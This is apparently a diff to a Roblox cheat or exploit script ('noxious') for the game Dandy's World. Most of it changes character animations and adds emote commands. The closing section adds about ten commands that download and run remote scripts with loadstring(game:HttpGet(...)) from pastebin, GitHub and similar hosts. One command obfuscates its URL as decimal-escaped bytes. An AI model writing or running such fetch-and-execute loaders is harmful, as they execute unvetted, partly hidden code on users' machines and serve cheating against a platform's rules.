+		changeanim("Decode", 124702329627784)
+		changeanim("Run", 131545440842534)
+		changeanim("Idle", 78197156369403)
+	elseif toon == "poppy" then
+		notify("Poppy's animations equipped.", 5)
+		changeanim("Walk", 16409449646)
+		changeanim("Decode", 16205888741)
+		changeanim("Idle", 16205089554)
+	elseif toon == "razzleanddazzle" or toon == "rnd" or toon == "razzledazzle" then
+		notify("Razzle & Dazzle's animations equipped.", 5)
+		changeanim("Walk", 17451039864)
+		changeanim("Decode", 17452101828)
+		changeanim("Idle", 17450844457)
+	elseif toon == "rodger" then
+		notify("Rodger's animations equipped.", 5)
+		changeanim("Walk", 17097949440)
+		changeanim("Decode", 17098030743)
+		changeanim("Idle", 17097874814)
+	elseif toon == "scraps" then
+		notify("Scraps' animations equipped.", 5)
+		changeanim("Walk", 17554165839)
+		changeanim("Decode", 17559713038)
+		changeanim("Idle", 17553394893)
+	elseif toon == "shrimpo" then
+		notify("Shrimpo's animations equipped.", 5)
+		changeanim("Walk", 17561196171)
+		changeanim("Decode", 17561277632)
+		changeanim("Idle", 17561045485)
+	elseif toon == "teagan" then
+		notify("Teagan's animations equipped.", 5)
+		changeanim("Walk", 18183710195)
+		changeanim("Decode", 18184069793)
+		changeanim("Idle", 18183602038)
+	elseif toon == "tisha" then
+		notify("Tisha's animations equipped.", 5)
+		changeanim("Walk", 18152903980)
+		changeanim("Decode", 18153373004)
+		changeanim("Idle", 18152665882)
+	elseif toon == "toodles" then
+		notify("Toodles' animations equipped.", 5)
+		changeanim("Walk", 17504345651)
+		changeanim("Decode", 17506059864)
+		changeanim("Idle", 17504197216)
+	elseif toon == "yatta" then
+		notify("Yatta's animations equipped.", 5)
+		changeanim("Walk", 113493276030799)
+		changeanim("Decode", 81195350931735)
+		changeanim("Run", 121887597056169)
+		changeanim("Idle", 94672939370149)
+	elseif toon == "astro" then
+		notify("Astro's animations equipped.", 5)
+		changeanim("Walk", 17477562502)
+		changeanim("Decode", 17485172105)
+		changeanim("Idle", 17477484184)
+	elseif toon == "bassie" then
+		notify("Bassie's animations equipped.", 5)
+		changeanim("Walk", 132205223700091)
+		changeanim("Decode", 119621623204298)
+		changeanim("Run", 10108152024909)
+		changeanim("Idle", 113260830809862)
+	elseif toon == "bobette" then
+		notify("Bobette's animations equipped.", 5)
+		changeanim("Walk", 108971895466704)
+		changeanim("Decode", 72425276030716)
+		changeanim("Run", 98111731270842)
+		changeanim("Idle", 121960921916341)
+	elseif toon == "pebble" or toon == "pebbles" then
+		notify("Pebble's animations equipped.", 5)
+		changeanim("Walk", 108621188713265)
+		changeanim("Decode", 130124125865280)
+		changeanim("Idle", 94925084807494)
+	elseif toon == "shelly" then
+		notify("Shelly's animations equipped.", 5)
+		changeanim("Walk", 18199493442)
+		changeanim("Decode", 18199567889)
+		changeanim("Idle", 18199284470)
+	elseif toon == "sprout" then
+		notify("Sprout's animations equipped.", 5)
+		changeanim("Walk", 18578948869)
+		changeanim("Decode", 18579081668)
+		changeanim("Idle", 18555568169)
+	elseif toon == "vee" then
+		notify("Vee's animations equipped.", 5)
+		changeanim("Walk", 97897738117999)
+		changeanim("Run", 72678141337718)
+		changeanim("Decode", 106108686337103)
+		changeanim("Idle", 87154718270671)
+	elseif toon == "ovee" then
+		notify("Vee's old animations equipped.", 5)
+		changeanim("Walk", 17294160873)
+		changeanim("Decode", 17308901433)
+		changeanim("Idle", 17293962722)
+	elseif toon == "eggson" then
+		notify("Eggson's animations equipped.", 5)
+		changeanim("Walk", 74613594041941)
+		changeanim("Decode", 71945598652324)
+		changeanim("Run", 140018826183412)
+		changeanim("Idle", 129628437580538)
+	elseif toon == "flyte" then
+		notify("Flyte's animations equipped.", 5)
+		changeanim("Walk", 132121208809384)
+		changeanim("Decode", 80233910746374)
+		changeanim("Run", 98768698423249)
+		changeanim("Idle", 71907669576411)
+	elseif toon == "cocoa" then
+		notify("Cocoa's animations equipped.", 5)
+		changeanim("Walk", 113856775888112)
+		changeanim("Decode", 1157632328364)
+		changeanim("Run", 112748305182855)
+		changeanim("Idle", 128300795612869)
+	elseif toon == "coal" then
+		notify("Coal's animations equipped.", 5)
+		changeanim("Walk", 116657137600663)
+		changeanim("Decode", 128454844417288)
+		changeanim("Run", 75018575525754)
+		changeanim("Idle", 131700177149552)
+	elseif toon == "ginger" then
+		notify("Ginger's animations equipped.", 5)
+		changeanim("Walk", 79443874564334)
+		changeanim("Decode", 76382478901588)
+		changeanim("Run", 73716601731008)
+		changeanim("Idle", 85220873784968)
+	elseif toon == "rudie" then
+		notify("Rudie's animations equipped.", 5)
+		changeanim("Walk", 89752421989409)
+		changeanim("Decode", 95207747046768)
+		changeanim("Run", 139414767968411)
+		changeanim("Idle", 80667484406688)
+
+	elseif toon == "tboxten" then
+		notify("Twisted Boxten's animations equipped.", 5)
+		changeanim("Walk", 17173980406)
+		changeanim("Run", 17174260770)
+		changeanim("Idle", 17173910857)
+	elseif toon == "tblot" then
+		notify("Twisted Blot's animations equipped.", 5)
+		changeanim("Walk", 136494123759902)
+		changeanim("Run", 102718775893345)
+		changeanim("Idle", 111801801891099)
+	elseif toon == "tbrightney" then
+		notify("Twisted Brightney's animations equipped.", 5)
+		changeanim("Walk", 17638574879)
+		changeanim("Run", 17638734882)
+		changeanim("Idle", 17638507046)
+	elseif toon == "tconnie" then
+		notify("Twisted Connie's animations equipped.", 5)
+		changeanim("Walk", 73609609622544)
+		changeanim("Run", 81505996760447)
+		changeanim("Idle", 140696695675999)
+	elseif toon == "tosmo" then
+		notify("Twisted Cosmo's animations equipped.", 5)
+		changeanim("Walk", 18682136751)
+		changeanim("Run", 18682530957)
+		changeanim("Idle", 18682187542)
+	elseif toon == "tdandy" then
+		notify("Twisted Dandy's animations equipped.", 5)
+		changeanim("Walk", 17515542297)
+		changeanim("Run", 17516071317)
+		changeanim("Idle", 17515694121)
+	elseif toon == "tfinn" then
+		notify("Twisted Finn's animations equipped.", 5)
+		changeanim("Walk", 18740834988)
+		changeanim("Run", 18741061111)
+		changeanim("Idle", 18740791780)
+	elseif toon == "tflutter" then
+		notify("Twisted Flutter's animations equipped.", 5)
+		changeanim("Walk", 18226261062)
+		changeanim("Run", 18239928544)
+		changeanim("Idle", 18226198149)
+	elseif toon == "tgigi" then
+		notify("Twisted Gigi's animations equipped.", 5)
+		changeanim("Walk", 112750898606111)
+		changeanim("Run", 124691439016513)
+		changeanim("Idle", 138817858272409)
+	elseif toon == "tglisten" then
+		notify("Twisted Glisten's animations equipped.", 5)
+		changeanim("Walk", 18821107251)
+		changeanim("Run", 18833020404)		
+		changeanim("Idle", 18820870445)
+	elseif toon == "tgoob" then
+		notify("Twisted Goob's animations equipped.", 5)
+		changeanim("Walk", 17231273641)
+		changeanim("Run", 140018826183412)
+		changeanim("Idle", 17231779680)
+	elseif toon == "tlooey" then
+		notify("Twisted Looey's animations equipped.", 5)
+		changeanim("Walk", 100370803921306)
+		changeanim("Run", 131136472849981)
+		changeanim("Idle", 112606771950932)
+	elseif toon == "tpoppy" then
+		notify("Twisted Poppy's animations equipped.", 5)
+		changeanim("Walk", 17000195059)
+		changeanim("Run", 17000654428)
+		changeanim("Idle", 17000127805)
+	elseif toon == "trazzleanddazzle" or toon == "trnd" or toon == "trazzledazzle" then
+		notify("Twisted azzle & Dazzle's animations equipped.", 5)
+		changeanim("Walk", 18987891015)
+		changeanim("Run", 18987897664)
+		changeanim("Idle", 18987852729)
+	elseif toon == "trodger" then
+		notify("Twisted Rodger's animations equipped.", 5)
+		changeanim("Walk", 18988824994)
+		changeanim("Run", 18988830155)
+		changeanim("Idle", 17108594427)
+	elseif toon == "tscraps" then
+		notify("Twisted Scraps' animations equipped.", 5)
+		changeanim("Walk", 17573173656)
+		changeanim("Run", 17574064271)
+		changeanim("Idle", 17573097161)
+	elseif toon == "tshrimpo" then
+		notify("Twisted Shrimpo's animations equipped.", 5)
+		changeanim("Walk", 17592227490)
+		changeanim("Run", 17592396609)
+		changeanim("Idle", 17592191827)
+	elseif toon == "tteagan" then
+		notify("Twisted Teagan's animations equipped.", 5)
+		changeanim("Walk", 18196889227)
+		changeanim("Run", 18197017631)
+		changeanim("Idle", 18196187882)
+	elseif toon == "ttisha" then
+		notify("Twisted Tisha's animations equipped.", 5)
+		changeanim("Walk", 18167280146)
+		changeanim("Run", 18167378530)
+		changeanim("Idle", 18167087346)
+	elseif toon == "ottoodles" then
+		notify("Twisted Toodles' old animations equipped.", 5)
+		changeanim("Walk", 17649028343)
+		changeanim("Run", 17649190982)
+		changeanim("Idle", 17648960939)
+	elseif toon == "ttoodles" then
+		notify("Twisted Toodles' animations equipped.", 5)
+		changeanim("Walk", 17649028343)
+		changeanim("Run", 91029796934547)
+		changeanim("Idle", 17648960939)
+	elseif toon == "tyatta" then
+		notify("Twisted Yatta's animations equipped.", 5)
+		changeanim("Walk", 130346494434784)
+		changeanim("Run", 104220653814120)
+		changeanim("Idle", 118127032092109)
+	elseif toon == "tastro" then
+		notify("Twisted Astro's animations equipped.", 5)
+		changeanim("Walk", 17617109508)
+		changeanim("Run", 17617489384)
+		changeanim("Idle", 17616899088)
+	elseif toon == "tbassie" then
+		notify("Twisted Bassie's animations equipped.", 5)
+		changeanim("Walk", 130316854498842)
+		changeanim("Run", 80250651929564)
+		changeanim("Idle", 72811631558470)
+	elseif toon == "tbobette" then
+		notify("Twisted Bobette's animations equipped.", 5)
+		changeanim("Walk", 112758791648621)
+		changeanim("Run", 124902427828033)
+		changeanim("Idle", 92649757944698)
+	elseif toon == "tpebble" or toon == "tpebbles" then
+		notify("Twisted Pebble's animations equipped.", 5)
+		changeanim("Walk", 16468055582)
+		changeanim("Run", 14640401802)
+		changeanim("Idle", 14544956730)
+	elseif toon == "tshelly" then
+		notify("Twisted Shelly's animations equipped.", 5)
+		changeanim("Walk", 18213481024)
+		changeanim("Run", 18213671382)
+		changeanim("Idle", 18212982332)
+	elseif toon == "tsprout" then
+		notify("Twisted Sprout's animations equipped.", 5)
+		changeanim("Walk", 18698688472)
+		changeanim("Run", 18699674490)
+		changeanim("Idle", 18698546825)
+	elseif toon == "otvee" then
+		notify("Twisted Vee's old animations equipped.", 5)
+		changeanim("Walk", 17320859447)
+		changeanim("Run", 17322657144)		
+		changeanim("Idle", 17320732816)
+	elseif toon == "tvee" then
+		notify("Twisted Vee's animations equipped.", 5)
+		changeanim("Walk", 140422342173966)
+		changeanim("Run", 73725947198210)		
+		changeanim("Idle", 121275292923999)
+	elseif toon == "teggson" then
+		notify("Twisted Eggson's animations equipped.", 5)
+		changeanim("Walk", 70943522849975)
+		changeanim("Run", 134803511177431)
+		changeanim("Idle", 94997531878151)
+	elseif toon == "tflyte" then
+		notify("Twisted Flyte's animations equipped.", 5)
+		changeanim("Walk", 102707652492072)
+		changeanim("Run", 105764212938666)
+		changeanim("Idle", 101910614628814)
+	elseif toon == "tcocoa" then
+		notify("Twisted Cocoa's animations equipped.", 5)
+		changeanim("Walk", 124995985864941)
+		changeanim("Run", 77242325839730)
+		changeanim("Idle", 89407029329628)
+	elseif toon == "tcoal" then
+		notify("Twisted Coal's animations equipped.", 5)
+		changeanim("Walk", 132967583757528)
+		changeanim("Run", 88133391461421)
+		changeanim("Idle", 101231527013004)
+	elseif toon == "tginger" then
+		notify("Twisted Ginger's animations equipped.", 5)
+		changeanim("Walk", 87274628660556)
+		changeanim("Run", 75137556095690)
+		changeanim("Idle", 82455189191938)
+	elseif toon == "trudie" then
+		notify("Twisted Rudie's animations equipped.", 5)
+		changeanim("Walk", 94861044577621)
+		changeanim("Run", 137822127469681)
+		changeanim("Idle", 122501058377674)
+	end
+end
+
+function resetanimpack()
+	if movementcheck then
+		movementcheck:Disconnect()
+		movementcheck = nil
+	end
+
+	for name, track in pairs(animpacktracking) do
+		if track and track:IsA("AnimationTrack") then
+			if track.IsPlaying then
+				track:Stop(0.1)
+			end
+			track:Destroy()
+		end
+		animpacktracking[name] = nil
+	end
+
+	lastmovementstate = {
+		moving = false,
+		sprinting = false,
+		decoding = false
+	}
+
+	local character = noxious["local player"] and noxious["local player"].Character
+	if character then
+		local animate = character:FindFirstChild("Animate")
+		if animate and not animate.Enabled then
+			animate.Enabled = true
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local istposeloopenabled = false
+local tposeloopconnection
+
+function pauseanims()
+	local animator = humanoid:WaitForChild"Animator"		
+	for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+		track:Stop()
+	end
+end
+
+addcommand("tpose", "tpose", function()
+	if istposeloopenabled then return end
+	istposeloopenabled = true
+
+	tposeloopconnection = noxious["run service"].Heartbeat:Connect(function()
+		if istposeloopenabled then
+			pauseanims()
+		end
+	end)
+end)
+
+addcommand("untpose", "untpose", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+
+	if not istposeloopenabled then return end
+	istposeloopenabled = false
+
+	if tposeloopconnection then
+		tposeloopconnection:Disconnect()
+		tposeloopconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local currentAnimationTrack 	
+local inputConnection
+
+barrelrollanim = Instance.new("Animation")	
+barrelrollanim.AnimationId = "rbxassetid://18226927388"
+
+waveanim = Instance.new("Animation")	
+waveanim.AnimationId = "rbxassetid://17059625743"
+
+twirlanim = Instance.new("Animation")	
+twirlanim.AnimationId = "rbxassetid://17630950280"
+
+twirl2anim = Instance.new("Animation")	
+twirl2anim.AnimationId = "rbxassetid://18998583113"
+
+cheeranim = Instance.new("Animation")	
+cheeranim.AnimationId = "rbxassetid://18199893624"
+
+shimmyanim = Instance.new("Animation")	
+shimmyanim.AnimationId = "rbxassetid://18155419600"
+
+jumpanim = Instance.new("Animation")	
+jumpanim.AnimationId = "rbxassetid://17295478127"
+
+facepalmanim = Instance.new("Animation")	
+facepalmanim.AnimationId = "rbxassetid://73742913578970"
+
+pounceanim = Instance.new("Animation")	
+pounceanim.AnimationId = "rbxassetid://17617839395"
+
+diveanim = Instance.new("Animation")	
+diveanim.AnimationId = "rbxassetid://17175061517"
+
+kickanim = Instance.new("Animation")	
+kickanim.AnimationId = "rbxassetid://18683187890"
+
+stompanim = Instance.new("Animation")	
+stompanim.AnimationId = "rbxassetid://17593325631"
+
+shakeheadanim = Instance.new("Animation")	
+shakeheadanim.AnimationId = "rbxassetid://17010929179"
+
+function playEmote(animation)
+	if currentAnimationTrack then
+		currentAnimationTrack:Stop()
+	end
+	currentAnimationTrack = humanoid:LoadAnimation(animation)
+	currentAnimationTrack:Play()
+	currentAnimationTrack:AdjustWeight(999)
+end
+
+function dwbarrelroll() playEmote(barrelrollanim) end
+function dwwave() playEmote(waveanim) end
+function dwtwirl() playEmote(twirlanim) end
+function dwtwirl2() playEmote(twirl2anim) end
+function dwcheer() playEmote(cheeranim) end
+function dwshimmy() playEmote(shimmyanim) end
+function dwjump() playEmote(jumpanim) end
+function dwfacepalm() playEmote(facepalmanim) end
+function dwdive() playEmote(diveanim) end
+function dwpounce() playEmote(pounceanim) end
+
+function disableAnimation()
+	if inputConnection then
+		inputConnection:Disconnect()
+		inputConnection = nil
+	end
+end
+
+function enableAnimation(animationFunction)
+	disableAnimation()
+	inputConnection = noxious["user input service"].InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then return end
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			animationFunction()
+		end
+	end)
+end
+
+noxious["local player"].CharacterAdded:Connect(updateCharacterReferences)
+
+noxious["local player"].CharacterAdded:Connect(function(character)
+	character:WaitForChild"Humanoid"	
+end)
+
+addcommand("headbang", "hbang", function()
+	local HeadbangAnim = Instance.new("Animation")		
+	HeadbangAnim.AnimationId = "rbxassetid://17561277632"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(HeadbangAnim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("dance", "dance", function()
+
+	local DanceAnim = Instance.new("Animation")		
+	DanceAnim.AnimationId = "rbxassetid://17516071317"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(DanceAnim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("crawl", "crawl", function()
+	if cannotruninlobby() then return end
+
+	local TherianAnim = Instance.new("Animation")		
+	TherianAnim.AnimationId = "rbxassetid://91029796934547"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(TherianAnim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("therian", "therian", function()
+	if cannotruninlobby() then return end
+	local TherianAnim = Instance.new("Animation")		
+	TherianAnim.AnimationId = "rbxassetid://17649190982"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(TherianAnim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("cradle", "cradle", function()
+	local SitAnim = Instance.new("Animation")		
+	SitAnim.AnimationId = "rbxassetid://18989418012"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(SitAnim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("sit", "sit", function()
+	local Sit2Anim = Instance.new("Animation")		
+	Sit2Anim.AnimationId = "rbxassetid://16873659196"
+
+	local humanoid = noxious["character"] and noxious["character"]:FindFirstChildOfClass("Humanoid")		
+	if humanoid then
+		if currentAnimationTrack then
+			currentAnimationTrack:Stop()
+		end
+
+		currentAnimationTrack = humanoid:LoadAnimation(Sit2Anim)
+		currentAnimationTrack:Play()
+
+		currentAnimationTrack:AdjustWeight(999)
+	end
+end)
+
+addcommand("unheadbang", "unhbang", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+addcommand("unsit", "unsit", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+addcommand("undance", "undance", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+addcommand("uncrawl", "uncrawl", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+addcommand("untherian", "untheiran", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+addcommand("uncradle", "uncradle", function()
+	local Char = noxious["character"]
+	local Human = Char and Char:WaitForChild("Humanoid", 15)
+	local Animate = Char and Char:WaitForChild("Animate", 15)
+
+	if Animate then
+		Animate.Disabled = true
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+		Animate.Disabled = false
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("wave", "wave", function()
+	playEmote(waveanim)
+end)
+
+addcommand("enableclickwave", "ecwave", function()
+	enableAnimation(dwwave)
+end)
+
+addcommand("disableclickwave", "dcwave", function()
+	disableAnimation(dwwave)
+end)
+
+addcommand("doabarrelroll", "dabr", function()
+	playEmote(barrelrollanim)
+end)
+
+addcommand("enableclickdoabarrelroll", "ecdabr", function()
+	enableAnimation(dwbarrelroll)
+end)
+
+addcommand("disableclickdoabarrelroll", "dcdabr", function()
+	disableAnimation(dwbarrelroll)
+end)
+
+addcommand("pounce", "pounce", function()
+	playEmote(pounceanim)
+end)
+
+addcommand("enableclickpounce", "ecpounce", function()
+	enableAnimation(dwpounce)
+end)
+
+addcommand("disableclickpounce", "dcpounce", function()
+	disableAnimation(dwpounce)
+end)
+
+addcommand("twirl", "twirl", function()
+	playEmote(twirlanim)
+end)
+
+addcommand("enableclicktwirl", "ectwirl", function()
+	enableAnimation(dwtwirl)
+end)
+
+addcommand("disableclicktwirl", "dctwirl", function()
+	disableAnimation(dwtwirl)
+end)
+
+addcommand("twirl2", "twirl2", function()
+	playEmote(twirl2anim)
+end)
+
+addcommand("enableclicktwirl2", "ectwirl2", function()
+	enableAnimation(dwtwirl2)
+end)
+
+addcommand("disableclicktwirl2", "dctwirl2", function()
+	disableAnimation(dwtwirl2)
+end)
+
+addcommand("shimmy", "shimmy", function()
+	playEmote(shimmyanim)
+end)
+
+addcommand("enableclickshimmy", "ecshimmy", function()
+	enableAnimation(dwshimmy)
+end)
+
+addcommand("disableclickshimmy", "dcshimmy", function()
+	disableAnimation(dwshimmy)
+end)
+
+addcommand("facepalm", "facepalm", function()
+	playEmote(facepalmanim)
+end)
+
+addcommand("enableclickfacepalm", "ecfacepalm", function()
+	enableAnimation(dwfacepalm)
+end)
+
+addcommand("disableclickfacepalm", "dcfacepalm", function()
+	disableAnimation(dwfacepalm)
+end)
+
+addcommand("jump", "jump", function()
+	playEmote(jumpanim)
+end)
+
+addcommand("enableclickjump", "ecjump", function()
+	enableAnimation(dwjump)
+end)
+
+addcommand("disableclickjump", "dcjump", function()
+	disableAnimation(dwjump)
+end)
+
+addcommand("cheer", "cheer", function()
+	playEmote(cheeranim)
+end)
+
+addcommand("enableclickcheer", "eccheer", function()
+	enableAnimation(dwcheer)
+end)
+
+addcommand("disableclickcheer", "dccheer", function()
+	disableAnimation(dwcheer)
+end)
+
+addcommand("dive", "dive", function()
+	playEmote(diveanim)
+end)
+
+addcommand("enableclickdive", "ecdive", function()
+	enableAnimation(dwdive)
+end)
+
+addcommand("disableclickdive", "dcdive", function()
+	disableAnimation(dwdive)
+end)
+
+addcommand("kick", "kick", function()
+	playEmote(kickanim)
+end)
+
+addcommand("enableclickkick", "eckick", function()
+	enableAnimation(kickanim)
+end)
+
+addcommand("disableclickkick", "dckick", function()
+	disableAnimation(kickanim)
+end)
+
+addcommand("stomp", "stomp", function()
+	playEmote(stompanim)
+end)
+
+addcommand("enableclickstomp", "ecstomp", function()
+	enableAnimation(stompanim)
+end)
+
+addcommand("disableclickstomp", "dcstomp", function()
+	disableAnimation(stompanim)
+end)
+
+addcommand("shakehead", "shakehead", function()
+	playEmote(shakeheadanim)
+end)
+
+addcommand("enableclickshakehead", "ecshakehead", function()
+	enableAnimation(shakeheadanim)
+end)
+
+addcommand("disableclickshakehead", "dcshakehead", function()
+	disableAnimation(shakeheadanim)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+spasmanims = {
+	"rbxassetid://17174260770",
+	"rbxassetid://17516071317",
+	"rbxassetid://17638507046",
+	"rbxassetid://17592396609",
+	"rbxassetid://133500601575506",
+	"rbxassetid://18213671382",
+	"rbxassetid://18833020404",
+	"rbxassetid://17231779680",
+}
+
+spasming = false
+spasmconnection = nil
+spasmtrack = nil
+
+addcommand("spasm", "spasm", function()
+	if spasming then return end
+	spasming = true
+
+	local lastIndex = nil
+
+	spasmconnection = noxious["run service"].RenderStepped:Connect(function()
+		if spasmtrack then
+			spasmtrack:Stop()
+			spasmtrack:Destroy()
+		end
+
+		local index
+		repeat index = math.random(1, #spasmanims) until index ~= lastIndex
+		lastIndex = index
+
+		local animation = Instance.new("Animation")
+		animation.AnimationId = spasmanims[index]
+		spasmtrack = humanoid:LoadAnimation(animation)
+		spasmtrack:Play()
+		spasmtrack:AdjustWeight(999)
+		spasmtrack:AdjustSpeed(999)
+	end)
+end)
+
+addcommand("unspasm", "unspasm", function()
+	if not spasming then return end
+	spasming = false
+
+	if spasmconnection then
+		spasmconnection:Disconnect()
+		spasmconnection = nil
+	end
+
+	if spasmtrack then
+		spasmtrack:Stop()
+		spasmtrack:Destroy()
+		spasmtrack = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+glitchanims = {
+	"rbxassetid://17174260770",
+	"rbxassetid://17516071317",
+	"rbxassetid://17638507046",
+	"rbxassetid://17592396609",
+	"rbxassetid://133500601575506",
+	"rbxassetid://18213671382",
+	"rbxassetid://18833020404",
+	"rbxassetid://17231779680",
+}
+
+glitching = false
+glitchtrack = nil
+glitchconnection = nil
+glitchcontroller = nil
+
+function getRandomDelay(isSpamming)
+	local r = math.random()
+	if isSpamming then
+		if r < 0.9 then
+			return math.random(10, 30) / 100
+		else
+			return math.random(30, 90) / 100
+		end
+	else
+		if r < 0.2 then
+			return math.random(30, 70) / 100
+		else
+			return math.random(80, 300) / 100
+		end
+	end
+end
+
+function startGlitchLoop()
+	local lastIndex = nil
+
+	glitchconnection = noxious["run service"].RenderStepped:Connect(function()
+		if glitchtrack then
+			glitchtrack:Stop()
+			glitchtrack:Destroy()
+		end
+
+		local index
+		repeat index = math.random(1, #glitchanims) until index ~= lastIndex
+		lastIndex = index
+
+		local animation = Instance.new("Animation")
+		animation.AnimationId = glitchanims[index]
+		glitchtrack = humanoid:LoadAnimation(animation)
+		glitchtrack:Play()
+		glitchtrack:AdjustWeight(999)
+		glitchtrack:AdjustSpeed(999)
+	end)
+end
+
+function stopGlitchLoop()
+	if glitchconnection then
+		glitchconnection:Disconnect()
+		glitchconnection = nil
+	end
+
+	if glitchtrack then
+		glitchtrack:Stop()
+		glitchtrack:Destroy()
+		glitchtrack = nil
+	end
+end
+
+addcommand("glitch", "glitch", function()
+	if glitching then return end
+	glitching = true
+
+	glitchcontroller = coroutine.create(function()
+		while glitching do
+			task.wait(getRandomDelay(false))
+			if not glitching then break end
+			startGlitchLoop()
+
+			task.wait(getRandomDelay(true))
+			if not glitching then break end
+			stopGlitchLoop()
+		end
+	end)
+
+	coroutine.resume(glitchcontroller)
+end)
+
+addcommand("unglitch", "unglitch", function()
+	if not glitching then return end
+	glitching = false
+
+	stopGlitchLoop()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("riddance", "scarlet", function()
+	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/02e4cd078ceb658b20c4074e697bc549.lua"))()
+end)
+
+addcommand("bacondwscript", "bacon", function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Dandy's%20World"))("t.me/arceusxscripts")		
+	end)
+end)
+
+addcommand("gobbydwscript", "gobby", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/FBRnb7S7"))()
+end)
+
+addcommand("spooksdwscript", "spooks", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/dandysworldspookshub/refs/heads/main/obfuscated%20spooks%20hub%20dandys%20world.lua'))()
+end)
+
+addcommand("moxdwscript", "spooks", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/ApparentlySpooks/moxhubV3/refs/heads/main/dandys%20world.txt'))()
+end)
+
+addcommand("hexdwscript", "hex", function()
+	loadstring(game:HttpGet"https://pastefy.app/lY7xd0Ks/raw")();
+end)
+
+addcommand("yiwdwscript", "yiw", function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\83\53\101\70\69\52\55\104\34\41\41\40\41")()
+end)
+
+addcommand("bobbydwscript", "bobby", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/Sup/refs/heads/main/Bobhub"))()
+end)
+
+addcommand("otvajnidwscript", "otvajni", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Amo1224gus/iriska/refs/heads/main/egashub.lua"))();
+end)
+
+addcommand("thedandyhelper", "rodestriker", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/RodeStriker/TheDandyHelper/refs/heads/main/MainScript", true))()
+end)
+
